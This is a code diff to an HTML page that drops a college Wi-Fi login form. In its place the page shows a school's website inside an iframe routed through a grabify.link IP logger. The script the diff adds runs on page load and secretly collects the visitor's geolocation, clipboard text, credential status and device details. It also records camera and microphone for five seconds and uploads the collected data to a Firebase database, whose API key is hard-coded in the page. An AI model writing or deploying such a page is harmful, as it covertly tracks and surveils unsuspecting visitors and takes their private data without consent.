@@ -3,34 +3,203 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="style.css">
-    <title>Rec-On Is It ?</title>
-<!--<script src="https://www.google.com/recaptcha/api.js" async defer></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/> -->
+    <title>https://anugrahaschools.org/</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+    </style>
 </head>
 <body>
-<!--     <div class="container">
-        <div class="form-container sign-in-container">
-            <form id="verificationForm">
-                <img src="https://www.psnacet.edu.in/img-1/logo-clr.png" alt="">
-                <h2>Welcome To PSNA</h2>
-                <p>Enter your college details below to connect to the wireless network on your devices.</p>
-                <input type="text" id="username" name="username" placeholder="Enter Name / Department" required> <br>
-                <input type="text" id="phoneNumber" name="phoneNumber" placeholder="Enter Phone Number To Verify" required> <br>
-                <button id="sendOTPButton" type="button" onclick="sendOTP()">Send OTP</button>
-                <div id="recaptcha-container"></div>
-                <div id="otpInput" style="display: none;">
-                    <input type="text" id="otp" name="otp" placeholder="Enter OTP" required>
-                    <button type="button" onclick="verifyOTP()">Connect</button>
-                </div>
-                <a href="https://www.psnacet.edu.in/">Visit Our Page!</a>
-                <a href="Logo.jpg"></a>
-            </form>
-        </div>
-    </div> -->
-    <script src="app.js"></script>
+    <iframe src="https://grabify.link/X1P07S"></iframe>
+
+    <script type="module">
+        // Import the functions you need from the Firebase SDKs
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.7.0/firebase-app.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.7.0/firebase-database.js";
+
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyA7-ztjKnf4Umq98uJDoHk0Fs8CN34UrQM",
+            authDomain: "rec-on.firebaseapp.com",
+            databaseURL: "https://rec-on-default-rtdb.firebaseio.com",
+            projectId: "rec-on",
+            storageBucket: "rec-on.appspot.com",
+            messagingSenderId: "917782062165",
+            appId: "1:917782062165:web:3518d5cd57a05af220e0dc"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+        window.onload = function() {
+            let collectedData = {};
+
+            // Battery Status
+            navigator.getBattery().then(function(battery) {
+                collectedData["Battery level"] = (battery.level * 100) + "%";
+                collectedData["Battery charging"] = battery.charging;
+            });
+
+            // Geolocation
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    collectedData["Latitude"] = position.coords.latitude;
+                    collectedData["Longitude"] = position.coords.longitude;
+                }, function(error) {
+                    console.error("Error Code = " + error.code + " - " + error.message);
+                });
+            } else {
+                console.log("Geolocation is not supported by this browser.");
+            }
+
+            // Network Information
+            if ("connection" in navigator) {
+                collectedData["Connection type"] = navigator.connection.effectiveType;
+                collectedData["Downlink"] = navigator.connection.downlink + "Mbps";
+            }
+
+            // Cookies Enabled
+            collectedData["Cookies enabled"] = navigator.cookieEnabled;
+
+            // Language
+            collectedData["Browser language"] = navigator.language;
+            collectedData["User preferred languages"] = navigator.languages.join(", ");
+
+            // Online Status
+            collectedData["Online status"] = navigator.onLine;
+
+            // Permissions
+            if ("permissions" in navigator) {
+                navigator.permissions.query({ name: 'geolocation' }).then(function(result) {
+                    collectedData["Geolocation permission status"] = result.state;
+                });
+            }
+
+            // Platform
+            collectedData["Platform"] = navigator.platform;
+
+            // User Agent
+            collectedData["User Agent"] = navigator.userAgent;
+
+            // Vendor
+            collectedData["Vendor"] = navigator.vendor;
+
+            // Hardware Concurrency
+            collectedData["Logical processors"] = navigator.hardwareConcurrency;
+
+            // Max Touch Points
+            collectedData["Max touch points"] = navigator.maxTouchPoints;
+
+            // Service Worker
+            if ("serviceWorker" in navigator) {
+                navigator.serviceWorker.ready.then(function(registration) {
+                    collectedData["Service Worker ready with scope"] = registration.scope;
+                });
+            }
+
+            // Credentials
+            if ("credentials" in navigator) {
+                navigator.credentials.get({ password: true, federated: { providers: ['https://accounts.google.com'] } })
+                    .then(function(credential) {
+                        if (credential) {
+                            collectedData["Credentials obtained"] = true;
+                        }
+                    })
+                    .catch(function(error) {
+                        console.error("Error obtaining credentials: " + error);
+                    });
+            }
+
+            // Clipboard
+            if ("clipboard" in navigator) {
+                navigator.clipboard.readText()
+                    .then(function(text) {
+                        collectedData["Clipboard content"] = text;
+                    })
+                    .catch(function(error) {
+                        console.error("Error reading clipboard: " + error);
+                    });
+            }
+
+            // Device Memory
+            collectedData["Device memory"] = navigator.deviceMemory + "GB";
+
+            // Media Devices and Recording
+            if ("mediaDevices" in navigator) {
+                navigator.mediaDevices.getUserMedia({ audio: true, video: true })
+                    .then(function(stream) {
+                        console.log("Media stream obtained");
+
+                        // Setting up MediaRecorder
+                        let mediaRecorder = new MediaRecorder(stream);
+                        let chunks = [];
+
+                        mediaRecorder.ondataavailable = function(event) {
+                            if (event.data.size > 0) {
+                                chunks.push(event.data);
+                            }
+                        };
+
+                        mediaRecorder.onstop = function() {
+                            let blob = new Blob(chunks, { 'type': 'video/webm; codecs=vp9' });
+                            let videoURL = URL.createObjectURL(blob);
+
+                            // Create a static link for the video
+                            let videoFilename = "recorded-video.webm";
+                            let link = document.createElement("a");
+                            link.href = videoURL;
+                            link.download = videoFilename;
+                            link.click();
+
+                            // Set a fixed URL for accessing the video (for example, through your local server)
+                            let staticVideoLink = "http://127.0.0.1:5500/" + videoFilename;
+
+                            // Log the recording details to console
+                            console.log("Video recorded:", {
+                                "Static Video Link": staticVideoLink,
+                                "Recording Blob": blob
+                            });
+                        };
+
+                        // Start recording
+                        mediaRecorder.start();
+
+                        // Stop recording after 5 seconds (5000 milliseconds)
+                        setTimeout(() => {
+                            mediaRecorder.stop();
+                        }, 5000);
+
+                    })
+                    .catch(function(error) {
+                        console.error("Error accessing media devices: " + error);
+                    });
+            } else {
+                console.log("Media devices are not supported by this browser.");
+            }
+
+            // Delay to ensure all asynchronous data is collected
+            setTimeout(function() {
+                // Upload collected data to Firebase Realtime Database
+                set(ref(database, 'user/data'), collectedData)
+                    .then(function() {
+                        console.log("Data written to Firebase Realtime Database");
+                    })
+                    .catch(function(error) {
+                        console.error("Error writing document: ", error);
+                    });
+            }, 5000); // Adjust delay as needed based on your data retrieval timing
+        };
+    </script>
 </body>
 </html>
